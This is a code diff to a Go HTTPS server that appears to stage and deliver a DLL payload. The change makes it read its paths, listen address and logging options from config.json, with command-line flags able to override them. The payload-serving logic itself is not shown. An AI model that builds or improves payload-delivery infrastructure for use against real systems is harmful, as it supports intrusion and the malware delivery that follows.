@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"encoding/binary"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -16,7 +17,18 @@ import (
 	"time"
 )
 
-// Configuration - will be initialized from command-line flags
+// Configuration structure that matches our JSON format
+type Config struct {
+	PayloadPath string `json:"payload_path"`
+	CertPath    string `json:"cert_path"`
+	KeyPath     string `json:"key_path"`
+	ListenAddr  string `json:"listen_addr"`
+	ServerRoot  string `json:"server_root"`
+	LogPath     string `json:"log_path"`
+	Verbose     bool   `json:"verbose"`
+}
+
+// Configuration - will be initialized from config.json or command-line flags
 var (
 	payloadPath string // Path to the DLL payload file
 	certPath    string // Path to the TLS certificate
@@ -26,6 +38,28 @@ var (
 	logPath     string // Path for logging access attempts
 	verbose     bool   // Enable verbose logging
 )
+
+// loadConfigFromFile attempts to load configuration from config.json
+func loadConfigFromFile(configPath string) (*Config, error) {
+	// Check if file exists
+	if _, err := os.Stat(configPath); os.IsNotExist(err) {
+		return nil, fmt.Errorf("config file not found: %s", configPath)
+	}
+
+	// Read the file
+	configData, err := os.ReadFile(configPath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read config file: %v", err)
+	}
+
+	// Parse JSON
+	var config Config
+	if err := json.Unmarshal(configData, &config); err != nil {
+		return nil, fmt.Errorf("failed to parse config file: %v", err)
+	}
+
+	return &config, nil
+}
 
 // Logger setup
 var (
@@ -374,19 +408,43 @@ func handleDefault(w http.ResponseWriter, r *http.Request) {
 // -------------------------------------------------------------------------
 
 func main() {
-	// Parse command-line flags
-	flag.StringVar(&payloadPath, "payload", "payload.bin", "Path to the payload file")
-	flag.StringVar(&certPath, "cert", "server.crt", "Path to TLS certificate")
-	flag.StringVar(&keyPath, "key", "server.key", "Path to TLS private key")
-	flag.StringVar(&listenAddr, "listen", "0.0.0.0:443", "Address:port to listen on")
-	flag.StringVar(&serverRoot, "root", "", "Root directory for static files")
-	flag.StringVar(&logPath, "log", "server.log", "Path for log file")
-	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")
+	// Try to load config from file first
+	configPath := "config.json"
+	config, err := loadConfigFromFile(configPath)
+
+	// Set up command-line flags with defaults from config file if available
+	if err == nil {
+		// Config file found, use it for defaults
+		flag.StringVar(&payloadPath, "payload", config.PayloadPath, "Path to the payload file")
+		flag.StringVar(&certPath, "cert", config.CertPath, "Path to TLS certificate")
+		flag.StringVar(&keyPath, "key", config.KeyPath, "Path to TLS private key")
+		flag.StringVar(&listenAddr, "listen", config.ListenAddr, "Address:port to listen on")
+		flag.StringVar(&serverRoot, "root", config.ServerRoot, "Root directory for static files")
+		flag.StringVar(&logPath, "log", config.LogPath, "Path for log file")
+		flag.BoolVar(&verbose, "verbose", config.Verbose, "Enable verbose logging")
+
+		// Print a message about using config file
+		fmt.Printf("Using configuration from %s\n", configPath)
+	} else {
+		// No config file, use hardcoded defaults
+		flag.StringVar(&payloadPath, "payload", "payload.bin", "Path to the payload file")
+		flag.StringVar(&certPath, "cert", "server.crt", "Path to TLS certificate")
+		flag.StringVar(&keyPath, "key", "server.key", "Path to TLS private key")
+		flag.StringVar(&listenAddr, "listen", "0.0.0.0:443", "Address:port to listen on")
+		flag.StringVar(&serverRoot, "root", "", "Root directory for static files")
+		flag.StringVar(&logPath, "log", "server.log", "Path for log file")
+		flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")
+
+		fmt.Printf("No config file found at %s, using command-line flags or defaults\n", configPath)
+	}
+
+	// Parse command-line flags (these will override config file settings if specified)
 	flag.Parse()
 
 	// Initialize logging
 	initLogging()
 
+	// The rest of your main() function remains the same...
 	// Verify payload exists
 	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
 		errorLog.Fatalf("Payload file not found: %s", payloadPath)
@@ -437,7 +495,7 @@ func main() {
 
 	// Start HTTPS server
 	infoLog.Println("Server ready to accept connections")
-	err := server.ListenAndServeTLS(certPath, keyPath)
+	err = server.ListenAndServeTLS(certPath, keyPath)
 	if err != nil {
 		errorLog.Fatalf("Server failed: %v", err)
 	}
